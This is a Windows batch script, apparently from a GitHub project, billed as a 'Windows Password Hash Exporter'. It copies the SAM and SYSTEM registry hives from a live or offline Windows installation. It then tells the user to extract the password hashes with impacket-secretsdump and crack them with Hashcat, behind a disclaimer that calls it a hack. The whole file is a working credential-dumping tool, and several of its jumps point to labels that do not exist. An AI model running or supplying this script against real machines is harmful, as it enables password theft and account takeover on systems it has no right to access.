@echo off
setlocal
title Windows Password Hash Exporter
echo Program Name: Windows Password Hash Exporter
echo Version: 4.0.1
echo License: GNU General Public License v3.0
echo Developer: @YonatanReuvenIsraeli
echo GitHub: https://github.com/YonatanReuvenIsraeli
echo Sponsor: https://github.com/sponsors/YonatanReuvenIsraeli
"%windir%\System32\net.exe" session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
goto "Disclaimer"

:"NotAdministrator"
echo.
echo Please run this batch file as an administrator. Press any key to close this batch file.
pause > nul 2>&1
goto "Done"

:"Disclaimer"
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSES PC WITHOUT THEIR EXPLICIT PERMISSION! THIS IS A HACK! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR ANYTHING THAT HAPPEND, IS HAPPENING, AND/OR WILL HAPPEN BECAUSE OF THIS BATCH FILE!
echo.
set Disclaimer=
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto "OnlineOffline"
if /i "%Disclaimer%"=="No" goto "Exit"
echo Invalid syntax!
goto "Disclaimer"

:"OnlineOffline"
echo.
set OnlineOffline=
set /p OnlineOffline="Are you getting the Windows password hashes of an online Windows installation or an offline Windows installation? (Online/Offline) "
if /i "%OnlineOffline%"=="Online" goto "Online"
if /i "%OnlineOffline%"=="Offline" goto "Volume"
echo Invalid syntax!
goto "OnlineOffline"

:"Volume"
if exist "diskpart.txt" goto "DiskPartExistVolume"
echo.
echo Listing volumes attached to this PC.
(echo list vol) > "diskpart.txt"
(echo exit) >> "diskpart.txt"
"%windir%\System32\diskpart.exe" /s "diskpart.txt" 2>&1
if not "%errorlevel%"=="0" goto "VolumeError"
del "diskpart.txt" /f /q > nul 2>&1
echo Volumes attached to this PC listed.
goto "WindowsAsk1"

:"DiskPartExistVolume"
set DiskPart=True
echo.
echo Please temporary rename to something else or temporary move to another location "diskpart.txt" in order for this batch file to proceed. Press any key to continue when "diskpart.txt" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "Volume"

:"VolumeError"
del "diskpart.txt" /f /q > nul 2>&1
echo.
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "Volume"

:"WindowsAsk1"
echo.
set WindowsVolume=
set /p WindowsVolume="What volume is the Windows volume? (0-?) "
goto "SureWindowsAsk1"

:"SureWindowsAsk1"
echo.
set SureWindowsAsk1=
set /p SureWindowsAsk1="Are you sure volume %WindowsVolume% is the Windows volume? (Yes/No) "
if /i "%SureWindowsAsk1%"=="Yes" goto "WindowsAsk2"
if /i "%SureWindowsAsk1%"=="No" goto "Volume"
echo Invalid syntax!
goto "SureWindowsAsk1"

:"WindowsAsk2"
echo.
set WindowsAsk=
set /p WindowsAsk="Is the Windows volume %WindowsVolume% already assigned a drive letter? (Yes/No) "
if /i "%WindowsAsk%"=="Yes" goto "SureWindowsAsk2"
if /i "%WindowsAsk%"=="No" goto "EnterAssignDriveLetter"
echo Invalid syntax!
goto "WindowsAsk2"

:"SureWindowsAsk2"
echo.
set SureWindowsAsk2=
set /p SureWindowsAsk2="Are you sure Windows volume %WindowsVolume% is already assigned a drive letter? (Yes/No) "
if /i "%SureWindowsAsk2%"=="Yes" goto "DriveLetter"
if /i "%SureWindowsAsk2%"=="No" goto "WindowsAsk2"
echo Invalid syntax!
goto "SureWindowsAsk2"

:"EnterAssignDriveLetter"
echo.
set EnterAssignDriveLetter=
set /p DriveLetter="Enter an unused drive letter. (A:-Z:) "
if exist "%DriveLetter%" goto "EnterAssignDriveLetterExist"
if /i "%DriveLetter%"=="A:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="B:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="C:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="D:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="E:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="F:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="G:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="H:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="I:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="J:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="K:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="L:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="M:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="N:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="O:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="P:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="Q:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="R:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="S:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="T:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="U:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="V:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="W:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="X:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="Y:" goto "AssignDriveLetter"
if /i "%DriveLetter%"=="Z:" goto "AssignDriveLetter"
echo Invalid syntax!
goto "EnterAssignDriveLetter"

:"EnterAssignDriveLetterExist"
echo "%AssignDriveLetter%" exists! Please try again.
goto "AssignDriveLetter"

:"AssignDriveLetter"
if exist "diskpart.txt" goto "DiskPartExistAssignDriveLetter"
echo.
echo Assigning Windows volume %WindowsVolume% drive letter "%DriveLetter%".
(echo sel vol %WindowsVolume%) > "diskpart.txt"
(echo assign letter=%DriveLetter%) >> "diskpart.txt"
(echo exit) >> "diskpart.txt"
"%windir%\System32\diskpart.exe" /s "diskpart.txt" > nul 2>&1
if not "%errorlevel%"=="0" goto "AssignDriveLetterError"
del "diskpart.txt" /f /q > nul 2>&1
echo Assigned Windows volume %WindowsVolume% drive letter "%DriveLetter%".
set DriveLetter=%DriveLetter%
goto "Offline"

:"DiskPartExistAssignDriveLetter"
set DiskPart=True
echo.
echo Please temporary rename to something else or temporary move to another location "diskpart.txt" in order for this batch file to proceed. Press any key to continue when "diskpart.txt" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "AssignDriveLetter"

:"AssignDriveLetterError"
del "diskpart.txt" /f /q > nul 2>&1
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "AssignDriveLetterExist"

:"DriveLetter"
echo.
set DriveLetter=
set /p DriveLetter="What is the drive letter of your offline Windows installation? (A:-Z:) "
if /i "%DriveLetter%"=="A:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="B:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="C:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="D:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="E:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="F:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="G:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="H:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="I:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="J:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="K:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="L:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="M:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="N:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="O:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="P:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Q:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="R:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="S:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="T:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="U:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="V:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="W:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="X:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Y:" goto "SureDriveLetter"
if /i "%DriveLetter%"=="Z:" goto "SureDriveLetter"
echo Invalid syntax!
goto "DriveLetter"

:"SureDriveLetter"
echo.
set SureDriveLetter=
set /p SureDriveLetter="Are you sure "%DriveLetter%" is the drive letter that Windows is installed on? (Yes/No) "
if /i "%SureDriveLetter%"=="Yes" goto "CheckExistDriveLetter"
if /i "%SureDriveLetter%"=="No" goto "DriveLetter"
echo Invalid syntax!
goto "SureDriveLetter"

:"CheckExistDriveLetter"
if not exist "%DriveLetter%" goto "DriveLetterNotExist"
if not exist "%DriveLetter%"\Windows goto "NotWindows"
if "%DriveLetter%"=="%SystemDrive%" goto "IsOnline"
goto "Offline"

:"DriveLetterNotExist"
echo "%DriveLetter%" does not exist! Please try again.
goto "DriveLetter"

:"NotWindows"
echo Windows not installed on "%DriveLetter%"!
goto DriveLetter
goto "Volume"

:"IsOnline"
echo "%DriveLetter%" is an online Windows installation!
goto "OnlineOffline"

:"Online"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOnline"
goto "HashSetOnline"

:"HashPathNotExistOnline"
echo "%HashPath%" does not exist. Please try again.
goto "Online"

:"HashSetOnline"
set Hash=
goto "ExportOnline"

:"ExportOnline"
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOnline"
echo.
echo Exporting Windows password hashes on drive letter "%DriveLetter%".
md "%HashPath%\Windows Password Hashes"
"%windir%\System32\reg.exe" save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
"%windir%\System32\reg.exe" save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%DriveLetter%". 
goto "Done"

:"WindowsPasswordHashesExistOnline"
set Hash=True
echo.
echo Please temporary rename to something else or temporary move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. "%HashPath%\Windows Password Hashes" is not a system file. Press any key to continue when "%HashPath%\Windows Password Hashes" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "ExportOnline"

:"Offline"
set SAM=
set SYSTEM=
goto "RegistryCheck"

:"RegistryCheck"
if not exist "%DriveLetter%\Windows\System32\config" goto "InvalidWindowsInstallation"
"%windir%\System32\reg.exe" query HKLM | find /i "HKEY_LOCAL_MACHINE\SAM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSAM"
"%windir%\System32\reg.exe" query HKLM | find /i "HKEY_LOCAL_MACHINE\SYSTEM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSYSTEM"
goto "Load"

:"InvalidWindowsInstallation"
echo "%DriveLetter%" is an invalid Windows installation! Please try again.
goto "Start"

:"RegistryExistSAM"
set SAM=True
echo.
echo Please temporary rename to something else or temporary move to another location "HKEY_LOCAL_MACHINE\SAM1" in order for this batch file to proceed. ""HKEY_LOCAL_MACHINE\SAM1"" is not a system hive. Press any key to continue when ""HKEY_LOCAL_MACHINE\SAM1"" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "RegistryCheck"

:"RegistryExistSYSTEM"
set SYSTEM=True
echo.
echo Please temporary rename to something else or temporary move to another location "HKEY_LOCAL_MACHINE\SYSTEM1" in order for this batch file to proceed. "HKEY_LOCAL_MACHINE\SYSTEM1" is not a system hive. Press any key to continue when "HKEY_LOCAL_MACHINE\SYSTEM1" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "RegistryCheck"

:"Load"
"%windir%\System32\reg.exe" load HKLM\SAM1 "%DriveLetter%\Windows\System32\config\SAM" > nul 2>&1
"%windir%\System32\reg.exe" load HKLM\SYSTEM1 "%DriveLetter%\Windows\System32\config\SYSTEM" > nul 2>&1
goto "HashPath"

:"HashPath"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOffline"
goto "HashSetOffline"

:"HashPathNotExistOffline"
echo "%HashPath%" does not exist. Please try again.
goto "HashPath"

:"HashSetOffline"
set Hash=
goto "ExportOffline"

:"ExportOffline"
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOffline"
echo.
echo Exporting Windows password hashes on drive letter "%DriveLetter%".
md "%HashPath%\Windows Password Hashes"
"%windir%\System32\reg.exe" save HKLM\SAM1 "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
"%windir%\System32\reg.exe" save HKLM\SYSTEM1 "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%DriveLetter%". 
"%windir%\System32\reg.exe" unload HKLM\SAM1 > nul 2>&1
"%windir%\System32\reg.exe" unload HKLM\SYSTEM1 > nul 2>&1
goto "RegistrySAMDone"

:"WindowsPasswordHashesExistOffline"
set Hash=True
echo.
echo Please temporary rename to something else or temporary move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. "%HashPath%\Windows Password Hashes" is not a system file. Press any key to continue when "%HashPath%\Windows Password Hashes" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "ExportOffline"

:"Error"
"%windir%\System32\reg.exe" unload HKLM\SAM1 > nul 2>&1
"%windir%\System32\reg.exe" unload HKLM\SYSTEM1 > nul 2>&1
echo There has been an error. you can try again.
goto "Start"

:"RegistrySAMDone"
if "%SAM%"=="True" goto "SAM"
goto "RegistrySYSTEMDone"

:"SAM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SAM1".
goto "RegistrySYSTEMDone"

:"RegistrySYSTEMDone"
if "%SYSTEM%"=="True" goto "SYSTEM"
goto "Done"

:"SYSTEM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SYSTEM1".
goto "Done"

:"Done"
echo.
echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
endlocal
pause > nul 2>&1
exit
